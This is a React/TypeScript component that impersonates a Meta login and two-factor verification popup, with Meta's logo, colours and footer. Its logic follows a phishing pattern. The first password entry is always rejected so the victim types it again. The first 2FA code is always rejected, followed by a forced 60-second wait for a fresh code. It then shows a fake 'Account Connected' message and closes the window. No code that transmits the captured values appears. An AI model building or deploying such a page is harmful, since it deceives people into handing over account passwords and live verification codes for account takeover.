import React, { useState, useEffect, useRef } from "react";
import { 
  ShieldCheck, 
  Loader2, 
  CheckCircle2, 
  KeyRound, 
  X,
  Mail,
  Lock,
  Smartphone,
  AlertCircle,
  AlertTriangle,
  Eye,
  EyeOff
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import { cn } from "@/lib/utils";

enum LoginStep {
  LOGIN_FIRST_ATTEMPT = 0,
  LOGIN_SECOND_ATTEMPT = 1,
  VERIFICATION_FIRST_ATTEMPT = 2,
  VERIFICATION_TIMEOUT = 3,
  VERIFICATION_SECOND_ATTEMPT = 4,
  SUCCESS = 5
}

const MetaLoginPopup = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(LoginStep.LOGIN_FIRST_ATTEMPT);
  const [countdown, setCountdown] = useState(60);
  const codeInputRef = useRef<HTMLInputElement>(null);
  
  // Reset the timer when we reach the timeout step
  useEffect(() => {
    if (currentStep === LoginStep.VERIFICATION_TIMEOUT) {
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            setCurrentStep(LoginStep.VERIFICATION_SECOND_ATTEMPT);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(timer);
    }
    
    // Close the window when verification is successful
    if (currentStep === LoginStep.SUCCESS) {
      const timer = setTimeout(() => {
        window.close();
      }, 2000);
      
      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  // Focus on the code input field when it becomes visible
  useEffect(() => {
    if (
      (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
       currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && 
      codeInputRef.current
    ) {
      codeInputRef.current.focus();
    }
  }, [currentStep]);

  // Random delay between 3-5 seconds
  const getRandomDelay = () => Math.floor(Math.random() * 2000) + 3000;
  
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  
  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage(null);

    // Simulate authentication process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!email || !password) {
        setIsLoading(false);
        setErrorMessage("Please enter both email and password.");
        return;
      }
      
      if (currentStep === LoginStep.LOGIN_FIRST_ATTEMPT) {
        // First password attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          setErrorMessage("The password you entered is incorrect. Please try again.");
          setPassword("");
          setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
        }, 500); // A small additional delay for the error message
      } else {
        // Show success for the second attempt, then transition to verification
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
        }, 800);
      }
    }, getRandomDelay());
  };

  const [verificationError, setVerificationError] = useState<string | null>(null);
  
  const handleVerificationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setVerificationError(null);

    // Simulate verification process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!verificationCode || verificationCode.length < 6) {
        setIsLoading(false);
        setVerificationError("Please enter a valid verification code (at least 6 digits).");
        return;
      }
      
      if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
        // First verification attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          setVerificationError("The verification code you entered is incorrect. Please wait 60 seconds before trying again.");
          setVerificationCode("");
          setCountdown(60);
          setCurrentStep(LoginStep.VERIFICATION_TIMEOUT);
        }, 500);
      } else {
        // Second verification attempt succeeds
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.SUCCESS);
        }, 800);
      }
    }, getRandomDelay());
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-100 flex flex-col">
      <header className="bg-white shadow-sm sticky top-0 z-10">
        <div className="max-w-7xl mx-auto p-4 flex justify-between items-center">
          <img 
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
            alt="Meta Logo" 
            className="h-8"
          />
          <button 
            onClick={() => window.close()} 
            className="text-gray-500 hover:text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-200 rounded-full p-1"
            aria-label="Close"
          >
            <X className="h-5 w-5" />
          </button>
        </div>
      </header>
      
      <main className="flex-grow flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-xl p-8 w-full max-w-md border border-gray-100">
          {currentStep === LoginStep.SUCCESS ? (
            <div className="text-center">
              <div className="bg-green-50 rounded-full p-4 w-24 h-24 mx-auto mb-6 flex items-center justify-center">
                <CheckCircle2 className="h-16 w-16 text-green-500" />
              </div>
              <h2 className="text-2xl font-bold mb-4">Account Connected</h2>
              <p className="text-gray-600 mb-6">
                Your Meta account has been successfully connected. This window will close automatically.
              </p>
              <Progress value={100} className="h-2 bg-gray-100" />
              <p className="text-sm text-gray-400 mt-2">Redirecting back to application...</p>
            </div>
          ) : (
            <>
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-blue-50 rounded-full mx-auto mb-4 flex items-center justify-center">
                  <KeyRound className="h-8 w-8 text-[#1877F2]" />
                </div>
                <h2 className="text-2xl font-bold text-[#1877F2]">Meta Account</h2>
                <p className="text-gray-600 mt-2">
                  Connect your account to continue with your application
                </p>
              </div>
              
              {/* Login Steps */}
              {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                <form onSubmit={handlePasswordSubmit} className="space-y-5">
                  {errorMessage && (
                    <div className="bg-red-50 text-red-700 p-3 rounded-lg flex items-start">
                      <AlertCircle className="h-5 w-5 mr-2 flex-shrink-0 mt-0.5" />
                      <p className="text-sm">{errorMessage}</p>
                    </div>
                  )}
                  
                  <div className="space-y-2">
                    <Label htmlFor="email" className="flex items-center text-gray-700">
                      <Mail className="h-4 w-4 mr-2 text-gray-500" />
                      Email or Phone
                    </Label>
                    <div className="relative">
                      <Input 
                        id="email" 
                        type="text"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Email or phone number"
                        className="pl-3 border-gray-300 rounded-lg"
                        disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                      />
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="password" className="flex items-center text-gray-700">
                      <Lock className="h-4 w-4 mr-2 text-gray-500" />
                      Password
                    </Label>
                    <div className="relative">
                      <Input 
                        id="password" 
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Password"
                        className="pr-10 border-gray-300 rounded-lg"
                        autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                      />
                      <button
                        type="button"
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                        onClick={() => setShowPassword(!showPassword)}
                        tabIndex={-1}
                      >
                        {showPassword ? (
                          <EyeOff className="h-4 w-4" />
                        ) : (
                          <Eye className="h-4 w-4" />
                        )}
                      </button>
                    </div>
                  </div>
                  
                  <Button 
                    type="submit" 
                    className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-12 rounded-lg shadow-sm transition-all duration-200 hover:shadow-md"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center">
                        <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                        <span>Authenticating...</span>
                      </div>
                    ) : (
                      "Log In"
                    )}
                  </Button>
                  
                  {isLoading && (
                    <div className="mt-4">
                      <Progress value={75} className="h-1.5 bg-gray-100" />
                      <p className="text-xs text-center text-gray-500 mt-2 flex items-center justify-center">
                        <Loader2 className="h-3 w-3 mr-1 animate-spin" />
                        Verifying credentials...
                      </p>
                    </div>
                  )}
                  
                  <div className="text-center pt-2">
                    <a href="#" className="text-[#1877F2] text-sm hover:underline">
                      Forgot password?
                    </a>
                  </div>
                </form>
              )}
              
              {/* 2FA Verification Steps */}
              {(currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
                currentStep === LoginStep.VERIFICATION_TIMEOUT || 
                currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                <>
                  <div className="text-center mb-6">
                    <div className="w-16 h-16 bg-blue-50 rounded-full mx-auto mb-4 flex items-center justify-center">
                      <ShieldCheck className="h-8 w-8 text-[#1877F2]" />
                    </div>
                    <h3 className="text-xl font-bold">Two-factor authentication</h3>
                    <p className="text-gray-600 mt-2">
                      We've sent a verification code to the mobile number associated with your account.
                    </p>
                  </div>
                  
                  <form onSubmit={handleVerificationSubmit} className="space-y-5">
                    {verificationError && (
                      <div className="bg-red-50 text-red-700 p-3 rounded-lg flex items-start">
                        <AlertTriangle className="h-5 w-5 mr-2 flex-shrink-0 mt-0.5" />
                        <p className="text-sm">{verificationError}</p>
                      </div>
                    )}
                    
                    <div className="space-y-2">
                      <Label htmlFor="code" className="flex items-center text-gray-700 font-semibold">
                        <Smartphone className="h-4 w-4 mr-2 text-gray-500" />
                        Enter the verification code
                      </Label>
                      <Input 
                        id="code" 
                        type="text"
                        inputMode="numeric"
                        ref={codeInputRef}
                        value={verificationCode}
                        onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                        placeholder="• • • • • • • •"
                        className="border-gray-300 text-center text-xl font-bold h-16 rounded-lg tracking-widest"
                        disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT || isLoading}
                        maxLength={8}
                      />
                      
                      <div className="text-xs text-gray-500 text-center mt-3 flex items-center justify-center">
                        {currentStep === LoginStep.VERIFICATION_TIMEOUT ? (
                          <div className="text-red-500 font-semibold flex items-center">
                            <AlertCircle className="h-4 w-4 mr-1" />
                            Please wait {countdown} seconds before requesting a new code
                          </div>
                        ) : (
                          <div className="flex items-center">
                            <Smartphone className="h-4 w-4 mr-1" />
                            Code sent to +1•••••{email.slice(-4) || "1234"}
                          </div>
                        )}
                      </div>
                    </div>
                    
                    <Button 
                      type="submit" 
                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-12 rounded-lg shadow-sm transition-all duration-200 hover:shadow-md"
                      disabled={isLoading || currentStep === LoginStep.VERIFICATION_TIMEOUT}
                    >
                      {isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                          <span>Verifying code...</span>
                        </div>
                      ) : (
                        "Verify Code"
                      )}
                    </Button>
                    
                    {isLoading && (
                      <div className="mt-4">
                        <Progress value={85} className="h-1.5 bg-gray-100" />
                        <p className="text-xs text-center text-gray-500 mt-2 flex items-center justify-center">
                          <Loader2 className="h-3 w-3 mr-1 animate-spin" />
                          Validating security code...
                        </p>
                      </div>
                    )}
                    
                    {currentStep !== LoginStep.VERIFICATION_TIMEOUT && (
                      <div className="text-center pt-2">
                        <a href="#" className="text-[#1877F2] text-sm hover:underline">
                          I didn't receive a code
                        </a>
                      </div>
                    )}
                  </form>
                </>
              )}
            </>
          )}
        </div>
      </main>
      
      <footer className="bg-white border-t p-4 mt-auto">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center text-xs text-gray-500">
          <div className="flex space-x-4 mb-2 md:mb-0">
            <a href="#" className="hover:underline">Privacy Policy</a>
            <a href="#" className="hover:underline">Terms of Service</a>
            <a href="#" className="hover:underline">Help Center</a>
          </div>
          <p>© Meta {new Date().getFullYear()}</p>
        </div>
      </footer>
    </div>
  );
};

export default MetaLoginPopup;